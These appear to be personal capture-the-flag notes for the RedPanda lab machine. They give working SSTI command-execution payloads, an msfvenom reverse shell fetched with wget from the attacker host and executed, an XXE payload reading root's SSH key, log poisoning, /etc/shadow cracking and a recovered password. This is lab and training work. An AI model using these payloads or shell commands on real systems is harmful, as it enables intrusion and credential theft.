`sudo nmap -p22,8080 -sSCV -O -A -oA nmap_scan 10.10.11.170`

trying a simple SSTI injection in the search bar with `${{<%[%'"}}%\` it appeared there were some banned characters.
trying `#{7*7}` it returned ??49_en_US??, indicating it is a legacy system
`@(6+5)` returned @?11


`@{3*3}` returned puerly 9 and so did `*{3*3}`

`*{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}` returned:
Process[pid=27648, exitValue="not exited"]

using the Java script from payloadallthethings:
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}` worked

using [this](https://www.browserling.com/tools/text-to-ascii) website, I created commands wihch I then ran

`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}`
--> returns I am currently the woodenk user

 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
 --> Linux redpanda 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 
 
Because of how timeconsuming writing and filling in the payloads would be manually, I created a quick script _payloadscript.py_

To get a shell:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.145 LPORT=9999 -f elf > shell1.elf`
`python payloadscript.py "wget http://10.10.14.145:8000/shell1.elf -O notevil1.elf"`
set up a python server + executed the outputted payoload in search bar
`python payloadscript.py "chmod +x notevil1.elf"`
`python payloadscript.py "./notevil1.elf"`
The final command spawned a shell on my listener, which I upgraded using `python3 -c 'import pty; pty.spawn("/bin/bash")'`


Here I got the flag.
(upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`)


# Foothold 
There is a tets_creds.xml file which appears to contain details about how a file is replaced?:
```xml
<?xml version="1.0"?>
<!DOCTYPE replacec [<!ENTITY ent SYSTEM 'file:///root/.ssh/id_rsa'>]>
<credits>
<author>woodenk</author>
<image>
<uri>/../../../../../../../home/woodenk/smile.jpg</uri>
<hello>&ent;</hello>
<views>0</views>
</image>
<totalviews>0</totalviews>
```
^ id_rsa stored in smile.jpg?


 Next:
 look through /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/
[this](https://portswigger.net/web-security/xxe/xml-entities) should be useful!
 
 
 
 
 ```Bash
 root         866  0.0  0.2   9420  4536 ?        S    17:19   0:00          _ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar 
 ```


--> in the jar file I found mysql credentials, and could access the database using:
```Bash
mysql -u woodenk -P 3306 -p
```
--> with the password _RedPandazRule_ which also turned out to be the password to the linux machine




################# The Privesc:
Logs group --> panda is part of
looking for files which this group has permission to: redpanda.log
Reading through /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java and doing a quick search for logs `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/` I found the interesting file App.java i LogParser:
--> only .jpg files are accepted
--> the full path of `/opt/panda_search/src/main/resources/static + uri` must be used
--> a tag name of "Artist"
--> `String[] strings = line.split("\\|\\|");`
--> this shows how the xml and image files are stored in the credits folder, and if the file is an image (true) then everything is written to a redpanda.log file.

POA:
1. create an xml file with the contents similar to test_creds.xml
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
  <!ELEMENT replace ANY >
  <!ENTITY example SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>test</author>
  <image>
    <replace>&example;</replace>
    <uri>/../../../../../../home/woodenk/image.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>2</totalviews>
</credits>
```
2. get any jpg file, and use xiftool to set the artist user agent to that of the xml file, using the directory which we have write permission to and where the image + xml file will be stored:
`exiftool -Artist='../home/woodenk/test' image.jpg`
3. upload both files to _/home/woodenk_ directory
4. curl a request to enter the file in the log:
`curl http://10.10.11.170:8080/stats -A "||/../../../../../../../home/woodenk/image.jpg"`
OR just echo it in: 
`echo "222||a||a||/../../../../../../home/woodenk/image.jpg" > /opt/panda_search/redpanda.log`
(double check it is in the log)
4. wait for a few minutes, and cat the xml file, the contents you asked for should be in the file.
5. saving the id_rsa file, changing the permissions to 400 then connect to box in a root shell:
--> `ssh -i id_rsa root@10.10.11.170`



--> same method used to get contents of _/etc/shadow_ --> which could be cracked as it was $6:






[good writeup](https://shakuganz.com/2022/07/12/hackthebox-redpanda/)

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
